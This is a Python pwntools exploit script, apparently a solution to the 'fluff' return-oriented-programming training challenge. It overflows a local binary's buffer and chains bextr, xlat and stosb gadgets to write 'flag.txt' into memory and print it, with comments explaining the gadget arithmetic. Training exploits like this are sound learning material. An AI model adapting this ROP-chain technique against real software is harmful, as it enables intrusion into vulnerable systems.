from pwn import *

elf = ELF('./fluff')
p = elf.process()

context.arch = 'amd64'
context.log_level = 'debug'

#Gadgets
pop_bextr = p64(0x000000000040062a)
xlat = p64(0x0000000000400628)
stosb = p64(0x0000000000400639)
pop_rdi = p64(0x00000000004006a3)
print_file = p64(0x0000000000400510)

#Pwn
write_mem = 0x00601038
payload = b'A'*40
file_name = b'flag.txt'
file_loc =[]

#Get memory locations of file characters
for char in file_name:
	file_loc.append(next(elf.search(char)))

print(file_loc)

#Exploit
for i in range (0,8):
	if i==0:
		al_value = 0xb
	else:
		al_value = int(file_name[i-1])

	exploit = pop_bextr + p64(0x4000)+ p64(file_loc[i] - al_value - 0x3ef2) + xlat + pop_rdi + p64(write_mem + i) + stosb
	payload += exploit	

# Explain the exploit function:

# We want put the memory location of each character into the al register, then with the stobs gadget we can
# write it into an empty memory segment.

# The bextr will extract bits from rcx with length and starting index value specifies by the rdx and move it
# to the rbx register.(https://www.felixcloutier.com/x86/bextr)

# xlat instruction will take value in al as an offset then with do something like this : al = [rbx + al]
# Because rbx already contains the location of the character so we will want : [rbx + al] = rbx

# That why we subtract the al_value and 0x3ef2 (specify in the gadget) so that after the xlat instruction, 
# al will have the value we want, that's the memory location we put in rbx initially

# Repeat this with all the character in the file name and we will get the file name in the memory segment :"> 


#Print file
payload += pop_rdi
payload += p64(write_mem)
payload += print_file

p.sendline(payload)
p.recvall()
